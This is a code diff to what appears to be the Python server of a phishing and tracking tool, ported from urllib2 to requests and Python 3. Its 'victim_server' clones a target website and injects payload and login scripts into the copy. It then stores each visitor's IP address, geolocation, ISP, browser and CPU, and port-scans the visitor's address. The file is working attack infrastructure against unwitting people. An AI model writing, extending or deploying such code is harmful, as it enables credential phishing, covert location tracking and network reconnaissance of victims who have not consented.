@@ -21,6 +21,8 @@ from core.db import Database
 import os
 import sys
 import platform
+import urllib
+import requests
 from multiprocessing import Process
 """
 from bs4 import BeautifulSoup
@@ -38,9 +40,6 @@ db = Database()
 class victim_server(object):
     @app.route("/" + trape.victim_path)
     def homeVictim():
-        opener = urllib2.build_opener()
-        headers = victim_headers(request.user_agent)
-        opener.addheaders = headers
         """
         clone_html  = opener.open(trape.url_to_clone).read()
         soup = BeautifulSoup(clone_html, 'lxml')
@@ -63,10 +62,11 @@ class victim_server(object):
                 if url.startswith('/'):
                     clone_html = clone_html.replace(url, domain + url)
         """
+        r = requests.get(trape.url_to_clone, headers=victim_headers2(request.user_agent))
         if (trape.type_lure == 'local'):
-            html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps))
+            html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps, trape.ipinfo))
         else:
-            html = assignScripts(victim_inject_code(opener.open(trape.url_to_clone).read(), 'payload', trape.url_to_clone, trape.gmaps))
+            html = assignScripts(victim_inject_code(r.content, 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
         return html
 
     @app.route("/register", methods=["POST"])
@@ -74,10 +74,10 @@ class victim_server(object):
         vId = request.form['vId']
         if vId == '':
           vId = utils.generateToken(5)
-
+        
         victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
-        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent), request.form['refer'])
-
+        victimGeo = victim_geo(vId, request.form['city'], request.form['country_code2'], request.form['country_name'], request.form['ip'], request.form['latitude'], request.form['longitude'], request.form['isp'], request.form['country_code3'], request.form['state_prov'], '', request.form['zipcode'], request.form['organization'], str(request.user_agent), '')
+        
         vRA = request.environ['REMOTE_ADDR']
 
         gHA = Process(target=getHostsAlive, args=(vRA, vId,))
@@ -159,10 +159,10 @@ class victim_server(object):
         url = request.args.get('url')
         if url[0:4] != 'http':
             url = 'http://' + url
-        opener = urllib2.build_opener()
+        opener = urllib.request.build_opener()
         headers = victim_headers(request.user_agent)
         opener.addheaders = headers
-        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps))
+        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps, trape.ipinfo))
         return html
 
     @app.route("/regv", methods=["POST"])
@@ -223,10 +223,11 @@ def getHostsAlive(ip, vId):
         pass
 
 def assignScripts(code):
-    code = code.replace("base.js", trape.JSFiles[0]['src'])
-    code = code.replace("libs.min.js",trape.JSFiles[1]['src'])
-    code = code.replace("login.js", trape.JSFiles[2]['src'])
-    code = code.replace("payload.js", trape.JSFiles[3]['src'])
-    code = code.replace("trape.js", trape.JSFiles[4]['src'])
-    code = code.replace("vscript.js", trape.JSFiles[5]['src'])
+    code = code.replace("base.js".encode(), trape.JSFiles[0]['src'].encode())
+    code = code.replace("libs.min.js".encode(),trape.JSFiles[1]['src'].encode())
+    code = code.replace("login.js".encode(), trape.JSFiles[2]['src'].encode())
+    code = code.replace("payload.js".encode(), trape.JSFiles[3]['src'].encode())
+    code = code.replace("trape.js".encode(), trape.JSFiles[4]['src'].encode())
+    code = code.replace("vscript.js".encode(), trape.JSFiles[5]['src'].encode())
+    code = code.replace("custom.js".encode(), trape.JSFiles[6]['src'].encode())
     return code
